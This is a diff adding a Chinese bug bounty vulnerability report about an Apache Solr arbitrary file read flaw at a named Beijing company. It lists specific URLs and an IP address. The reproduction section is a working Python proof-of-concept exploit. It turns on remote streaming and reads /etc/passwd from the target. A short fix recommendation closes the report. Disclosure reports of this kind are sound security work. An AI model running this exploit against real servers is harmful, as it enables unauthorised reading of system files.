@@ -1,0 +1,41 @@
+厂商名称：北京云功信息技术有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在敏感文件泄露
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Apache Solr <= 8.8.1任意文件读取漏洞
+漏洞等级：高危
+漏洞url：http://techfly.com.cn:50000 http://www.yg-163.com:50000 http://www.techfly.com.cn:50000 http://www.i3yun.cn:50000 http://i3yun.cn:50000
+网站名称：北京云功信息技术有限公司
+网站ip：47.116.65.146
+所属地区：北京市通州区潞城镇武兴路7号A0490室
+漏洞描述：Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件
+公司业务：技术开发、技术推广、技术转让、技术咨询、技术服务；计算机系统服务；基础软件服务；应用软件服务（不含医用软件）；软件开发；产品设计；模型设计；包装装潢设计；教育咨询（不含培训）；经济贸易咨询；公共关系服务；会议服务；工艺美术设计；电脑图文设计、制作；企业策划；设计、制作、代理、发布广告；市场调查；企业管理咨询；组织文化艺术交流活动（不含演出）；文艺创作；承办展览展示活动；会议服务；翻译服务；自然科学研究；工程和技术研究；农业科学研究；医学研究；数据处理（数据处理中的银行卡中心、PUE值在1.5以上的云计算数据中心除外）；销售计算机软件、硬件及辅助设备。（市场主体依法自主选择经营项目，开展经营活动；以及依法须经批准的项目，经相关部门批准后依批准的内容开展经营活动；不得从事国家和本市产业政策禁止和限制类项目的经营活动。）
+复现步骤：
+# -*- coding: utf-8 -*-
+import requests
+
+host = "http://http://47.116.65.146:50000"
+if host[-1] == '/':
+    host = host[:-1]
+
+
+def poc(host):
+    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
+    core_data = requests.get(url, timeout=3).json()
+    if core_data['status']:
+        core = list(core_data['status'].keys())[0]
+        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
+        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)
+
+        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
+                                    data={"stream.url": "file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print(result_data['streams'][0]['stream'])
+    else:
+        exit("不存在此漏洞")
+
+
+poc(host)
+修复方案：由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip 
